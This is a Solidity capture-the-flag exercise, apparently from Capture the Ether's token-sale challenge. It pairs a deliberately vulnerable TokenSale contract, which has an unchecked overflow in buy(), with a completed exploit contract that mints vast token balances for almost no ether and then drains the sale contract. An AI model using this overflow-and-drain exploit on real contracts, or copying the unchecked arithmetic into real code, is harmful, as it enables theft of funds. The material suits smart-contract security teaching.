// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenSale {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable returns (uint256) {
        uint256 total = 0;
        unchecked {
            total += numTokens * PRICE_PER_TOKEN;
        }
        require(msg.value == total);

        balanceOf[msg.sender] += numTokens;
        return (total);
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenSale public tokenSale;

    constructor(TokenSale _tokenSale) {
        tokenSale = _tokenSale;
    }

    receive() external payable {}

    // write your exploit functions below
    /**
     * - `unchecked` block in `buy` can make `total` overflow for a large value of `numTokens`
     * - once we own large `numTokens` we can drain the contract 
     */
    function exploit() public {
        // calculate total tokens that max value of ether can buy
        uint256 numTokens;
        unchecked {
            numTokens = type(uint256).max / 1 ether + 1;
        }

        // the following will require little to no ether but will mint large number of tokens to us
        uint256 total = 0;
        unchecked {
            // calculate the total after overflow
            total = numTokens * 1 ether;
        }
        // buy numTokens
        tokenSale.buy{value: total}(numTokens);

        // calculate numTokens to sell
        unchecked {
            numTokens = address(tokenSale).balance / 1 ether;
        }
        tokenSale.sell(numTokens);
    }
}